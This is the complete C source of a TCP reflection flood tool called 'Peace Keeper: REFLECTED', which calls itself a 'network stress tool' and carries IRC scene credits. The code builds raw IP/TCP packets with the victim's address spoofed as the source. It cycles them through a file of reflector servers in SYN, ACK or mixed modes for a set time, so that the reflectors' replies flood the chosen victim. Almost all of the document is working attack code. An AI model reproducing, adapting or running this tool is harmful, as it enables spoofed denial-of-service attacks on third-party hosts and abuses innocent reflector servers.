/*                   .ed"""" """$$$$be.
                   -"           ^""**$$$e.
                 ."                   '$$$c
                /                      "4$$b
               d  3                      $$$$
               $  *                   .$$$$$$
              .$  ^c           $$$$$e$$$$$$$$.
              d$L  4.         4$$$$$$$$$$$$$$b
              $$$$b ^ceeeee.  4$$ECL.F*$$$$$$$
  e$""=.      $$$$P d$$$$F $ $$$$$$$$$- $$$$$$
 z$$b. ^c     3$$$F "$$$$b   $"$$$$$$$  $$$$*"      .=""$c
4$$$$L        $$P"  "$$b   .$ $$$$$...e$$        .=  e$$$.
^*$$$$$c  %..   *c    ..    $$ 3$$$$$$$$$$eF     zP  d$$$$$
  "**$$$ec   "   %ce""    $$$  $$$$$$$$$$*    .r" =$$$$P""
        "*$b.  "c  *$e.    *** d$$$$$"L$$    .d"  e$$***"
          ^*$$c ^$c $$$      4J$$$$$% $$$ .e*".eeP"
             "$$$$$$"'$=e....$*$$**$cz$$" "..d$*"
               "*$$$  *=%4.$ L L$ P3$$$F $$$P"
                  "$   "%*ebJLzb$e$$$$$b $P"
                    %..      4$$$$$$$$$$ "
                     $$$e   z$$$$$$$$$$%
                      "*$c  "$$$$$$$P"
                       ."""*$$$$$$$$bc
                    .-"    .$***$$$"""*e.
                 .-"    .e$"     "*$c  ^*b.
          .=*""""    .e$*"          "*bc  "*$e..
        .$"        .z*"               ^*$e.   "*****e.
        $$ee$c   .d"                     "*$.        3.
        ^*$E")$..$"                         *   .ee==d%
           $.d$$$*                           *  J$$$e*
            """""                              "$$$"

-:- Private Version -:-
Peace Keeper: REFLECTED, A TCP/IPv4 network stress tool.
The traditional way of keeping the peace amongst the crowd.
By darkness@efnet (@tcphdr), greetz vae@efnet (@efnetsatan).
*/

#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdint.h>
#include <stdarg.h>
#include <time.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <signal.h>
#include <string.h>
#include <arpa/inet.h>
#include <netinet/tcp.h>
#include <stdbool.h>
#include <pthread.h>

// Defines, don't fucking touch kthx.
#define MAX_PACKET_LEN                8192          // Max packet size.
#define RAND_PORT_MIN                 1             // Min TCP port randomization
#define RAND_PORT_MAX                 65534         // Max TCP port randomization
#define TCP_WINDOW_SIZE_MIN           1             // Min TCP window size.
#define TCP_WINDOW_SIZE_MAX           65534         // Max TCP window size.
#define TCP_TTL_MIN                   32            // Min TCP TTL length
#define TCP_TTL_MAX                   255           // Max TCP TTL length
#define TCP_DATA_LEN_MIN              0             // Min TCP data length
#define TCP_DATA_LEN_MAX              1024          // Max TCP data length
#define STRINGLEN                     64            // Leave it alone
#define PHI                           0xaedc23      // Random Number Seed

// Variables and arrays.
char datagram[MAX_PACKET_LEN] = { 0 };
int rawsock = 0;
static uint32_t Q[4096], c = 518267;
unsigned int start = 0;
unsigned long long int packets = 0;
unsigned short databytes = 0;
unsigned int server_count = 0;
unsigned int reflectorAddr = 0;
unsigned short reflectorPort = 0;
unsigned int pktcount = 0, pktsent = 0;

// IP Packet Structure.
struct ip
{
    unsigned int ip_hl : 5;         /* header length */
    unsigned int ip_v : 4;          /* version */
    unsigned char ip_tos;           /* type of service */
    unsigned short ip_len;          /* total length */
    unsigned short ip_id;           /* identification */
    unsigned short ip_off;          /* fragment offset field */
    unsigned char ip_ttl;           /* time to live */
    unsigned char ip_p;             /* protocol */
    unsigned short ip_sum;          /* checksum */
    struct in_addr ip_src, ip_dst;  /* source and dest address */
};

// TCP Packet Structure.
struct tcp
{
    unsigned short th_sport;        /* source port */
    unsigned short th_dport;        /* destination port */
    unsigned int th_seq;            /* sequence number */
    unsigned int th_ack;            /* acknowledgement number */
    unsigned char th_x2 : 4;        /* (unused) */
    unsigned char th_off : 4;       /* data offset */
    unsigned char th_flags;         /* flags */
    unsigned short th_len;          /* tcp length */
    unsigned int th_proto;          /* protocol */
    unsigned short th_win;          /* window */
    unsigned short th_sum;          /* checksum */
    unsigned short th_urp;          /* urgent pointer */
    struct in_addr th_src, th_dst; /* src and dst ips for pseudo header */
};

unsigned short csum(unsigned short* ptr, int nbytes)
{
    register long sum;
    unsigned short oddbyte;
    register short answer;

    sum = 0;
    while (nbytes > 1)
    {
        sum += *ptr++;
        nbytes -= 2;
    }
    if (nbytes == 1)
    {
        oddbyte = 0;
        *((u_char*)&oddbyte) = *(u_char*)ptr;
        sum += oddbyte;
    }

    sum = (sum >> 16) + (sum & 0xffff);
    sum = sum + (sum >> 16);
    answer = (short)~sum;

    return(answer);
}

// Better number randomization function.
uint32_t rand_cmwc(void)
{
    uint64_t t, a = 18782LL;
    static uint32_t i = 4095;
    uint32_t x, r = 0xfffffffe;
    i = (i + 1) & 4095;
    t = a * Q[i] + c;
    c = (t >> 32);
    x = t + c;
    if (x < c)
    {
        x++;
        c++;
    }
    return (Q[i] = r - x);
}

unsigned int lookup(char* hostname)
{
    struct hostent* name;
    unsigned int address;

    if ((address = inet_addr(hostname)) != -1)
        return address;
    if ((name = gethostbyname(hostname)) == NULL)
        return -1;

    memcpy(&address, name->h_addr, name->h_length);
    return address;
}

struct reflector
{
    struct in_addr ip4_addr;
    unsigned short dport;
};
struct reflector* reflectors = NULL;

struct reflector* read_servers(char* filename)
{
    FILE* fp;
    uint32_t len = 0;
    uint32_t i;
    struct reflector* reflectors;
    char buffer[STRINGLEN];
    char input[2][STRINGLEN];
    char* p = NULL;

    if (!(fp = fopen(filename, "r")))
    {
        fprintf(stderr, "error: can't open file %s\n", filename);
        exit(-1);
    }

    len = 4096 * sizeof(struct reflector);
    reflectors = malloc(len);

    while (fgets(buffer, sizeof(buffer), fp))
    {
        if (server_count >= (len / sizeof(struct reflector)) - 2)
        {
            reflectors = realloc(reflectors, len + (4096 * sizeof(struct reflector)));
            len += 4096 * sizeof(struct reflector);
        }

        if (buffer[strlen(buffer) - 1] == '\n')
            buffer[strlen(buffer) - 1] = 0;

        input[0][0] = 0;
        input[1][0] = 0;
        p = NULL;

        for (i = 0; i < 2; i++)
        {
            if (!(p = strtok(p ? NULL : buffer, " ")))
                break;

            strncpy(input[i], p, sizeof(input[i]) - 1);
        }

        if (!input[1][0])
            continue;

        if ((reflectors[server_count].ip4_addr.s_addr = lookup(input[0])) == -1)
            continue;

        reflectors[server_count].dport = atoi(input[1]);
        server_count++;
    }
    printf("-> Loaded %u reflectors.\n", server_count);

    if (!server_count)
    {
        fprintf(stderr, "Error: 0 reflectors found!\n");
        exit(-1);
    }

    reflectors[server_count].dport = 0;
    return(reflectors);
}

// Seeding function for our rand number generator.
void init_rand(uint32_t x)
{
    int i;

    Q[0] = x;
    Q[1] = x + PHI;
    Q[2] = x + PHI + PHI;

    for (i = 3; i < 4096; i++)
        Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i;
}

void handle_exit()
{
    printf("-> Flood completed, %llu packets sent, %zu seconds, %llu packets/sec\n", packets, time(NULL) - start, packets / (time(NULL) - start));
    exit(0);
}

void attack(unsigned int dest, unsigned short dstport, unsigned int mode, unsigned int ttime)
{
    unsigned int z = 1;
    struct sockaddr_in sin;

    // Assemble header.
    struct ip* xf_iphdr = (struct ip*)datagram;
    struct tcp* xf_tcphdr = (struct tcp*)(datagram + sizeof(struct ip));

    // Tell the user about some bullshit taking place.
    if (dstport == 0)
        printf("-> Source Port Randomization [✔️]\n");

    sin.sin_family = AF_INET;
    xf_iphdr->ip_id = htons(rand_cmwc());
    xf_iphdr->ip_p = IPPROTO_TCP;
    xf_iphdr->ip_v = 4;
    xf_iphdr->ip_hl = 5;
    xf_iphdr->ip_tos = 0;
    xf_tcphdr->th_urp = 0;
    xf_iphdr->ip_off = htons(0x4000);
    xf_tcphdr->th_sum = 0;
    xf_tcphdr->th_off = sizeof(struct tcphdr) / 4;

    // Randomize TCP window
    xf_tcphdr->th_win = htons(65535);

    // Set TTL
    xf_iphdr->ip_ttl = TCP_TTL_MAX;

    // Set TCP options accordingly based on what kind of reflection attack we're doing.
    // pkt 1: ack=0 seq=rand
    // pkt2: ack=rand seq=oldseq+1

    switch (mode)
    {
        case 1:
        {
            xf_tcphdr->th_flags = 2;
            xf_tcphdr->th_seq = htonl(rand_cmwc());
            xf_tcphdr->th_ack = htonl(0);
            break;
        }
        case 2:
        {
            xf_tcphdr->th_flags = 16;
            xf_tcphdr->th_seq = htonl(rand_cmwc());
            xf_tcphdr->th_ack = htonl(rand_cmwc());
        }
    }
    // Set victim address and port.
    xf_iphdr->ip_src.s_addr = dest;
    xf_tcphdr->th_src.s_addr = dest;
    xf_tcphdr->th_sport = htons(dstport);

    // Set reflector and destination address and port.
    reflectorAddr = htonl(reflectors[z].ip4_addr.s_addr);
    reflectorPort = htons(reflectors[z].dport);
    xf_iphdr->ip_dst.s_addr = reflectorAddr;
    xf_tcphdr->th_dst.s_addr = reflectorAddr;
    xf_tcphdr->th_dport = reflectorPort;
    sin.sin_port = reflectorPort;

    // Calculate IP length
    xf_iphdr->ip_len = htons(sizeof(struct ip) + sizeof(struct tcphdr));

    // Calculate TCP Length
    xf_tcphdr->th_len = htons(sizeof(struct ip) + sizeof(struct tcphdr));

    // Calculate TCP checksum
    xf_iphdr->ip_sum = csum((unsigned short*)datagram, (sizeof(struct ip) + sizeof(struct tcphdr)));
    xf_tcphdr->th_sum = csum((unsigned short*)datagram, (sizeof(struct ip) + sizeof(struct tcphdr)));

    // Set start time.
    start = time(NULL);

    while (true)
    {
        // Check for timeout.
        if (time(NULL) - start >= ttime)
            handle_exit();

        // Reset reflector list if necessary.
        if (z >= server_count)
            z = 1, pktsent = 0;

        // Send the packet.
        sendto(rawsock, datagram, sizeof(struct ip) + sizeof(struct tcphdr), 0, (struct sockaddr*)&sin, sizeof(sin)), packets++, pktsent++, z++;

        // Set TCP options accordingly based on what kind of reflection attack we're doing.
        // pkt 1: ack=0 seq=rand
        // pkt2: ack=rand seq=oldseq+1
        switch (mode)
        {
            case 1:
            {
                xf_tcphdr->th_flags = 2;
                xf_tcphdr->th_seq = htonl(rand_cmwc());
                xf_tcphdr->th_ack = htonl(0);
                break;
            }
            case 2:
            {
                xf_tcphdr->th_flags = 16;
                xf_tcphdr->th_seq = htonl(rand_cmwc());
                xf_tcphdr->th_ack = htonl(rand_cmwc());
                break;
            }
            case 3:
            {
                if (pktsent == 0)
                {
                    xf_tcphdr->th_flags = 2;
                    xf_tcphdr->th_seq = htonl(rand_cmwc());
                }
                else if (pktsent == 1)
                {
                    pktsent = 0;
                    xf_tcphdr->th_flags = 16;
                    xf_tcphdr->th_seq = htonl(xf_tcphdr->th_seq + 1);
                    xf_tcphdr->th_ack = htonl(rand_cmwc());
                }
                break;
            }
        }

        // Randomize source port if requested.
        if (dstport == 0 && mode != 3)
            xf_tcphdr->th_sport = htons(((rand_cmwc() % RAND_PORT_MAX) + RAND_PORT_MIN));

        // Randomize TCP window
        xf_tcphdr->th_win = htons(((rand_cmwc() % TCP_WINDOW_SIZE_MAX) + TCP_WINDOW_SIZE_MIN));

        // Set reflector and destination address and port.
        reflectorAddr = htonl(reflectors[z].ip4_addr.s_addr);
        reflectorPort = htons(reflectors[z].dport);
        xf_iphdr->ip_dst.s_addr = reflectorAddr;
        xf_tcphdr->th_dst.s_addr = reflectorAddr;
        xf_tcphdr->th_dport = reflectorPort;
        sin.sin_port = reflectorPort;

        // Calculate IP length.
        xf_iphdr->ip_len = htons(sizeof(struct ip) + sizeof(struct tcphdr));

        // Calculate TCP Length
        xf_tcphdr->th_len = htons(sizeof(struct ip) + sizeof(struct tcphdr));

        // Calculate TCP checksum
        xf_iphdr->ip_sum = csum((unsigned short*)datagram, (sizeof(struct ip) + sizeof(struct tcphdr)));
        xf_tcphdr->th_sum = csum((unsigned short*)datagram, (sizeof(struct ip) + sizeof(struct tcphdr)));
    }
}

int main(int argc, char** argv)
{
    char* listName = { 0 };
    unsigned int dest = 0, ttime = 0;
    unsigned short dstport = 0;
    int tmp = 1, mode = 0;
    const int* val = &tmp;

    /* parse arguments */
    if (argv[1] == NULL || !strcmp(argv[1], "") || strcmp(argv[1], "BB"))
    {
        printf("-> Ah ah ah! You didn't say the magic word, deleting system file!\n");
        exit(0);
    }
    else
    {
        if (argc < 6)
        {
            printf("-> The supreme art of war is to subdue the enemy without fighting. - Peace Keeper, REFLECTED.\n");
            printf("USAGE : %s <key> <victim> <victim port> <list> <mode> <time>\n", argv[0]);
            exit(0);
        }
    }

    // Allocate Socket
    rawsock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (rawsock <= 0)
    {
        printf("socket(): create failed, die.\n");
        exit(-1);
    }

    // Set socket information
    if (setsockopt(rawsock, IPPROTO_IP, IP_HDRINCL, val, sizeof(tmp)) < 0)
    {
        printf("setsockopt(): cannot set HDRINCL, die.\n");
        exit(-1);
    }

    dest = lookup(argv[2]);
    dstport = atoi(argv[3]);
    listName = argv[4];
    mode = atoi(argv[5]);
    ttime = atoi(argv[6]);

    // Runtime sanity.
    if (mode > 3 || mode < 0)
    {
        printf("Invalid mode given, die.\n");
        exit(-1);
    }
    // This is a cryptic way of saying the method won't work.
    if (mode == 3 && dstport == 0)
    {
        printf("Cannot have random src port when using mode 3, die.\n");
        exit(-1);
    }

    // Seed num generation code.
    init_rand(time(NULL));

    // Set signals.
    signal(SIGINT, handle_exit);
    signal(SIGTERM, handle_exit);
    signal(SIGQUIT, handle_exit);

    // Read list.
    reflectors = read_servers(listName);

    // Call attack code.
    attack(dest, dstport, mode, ttime);
}
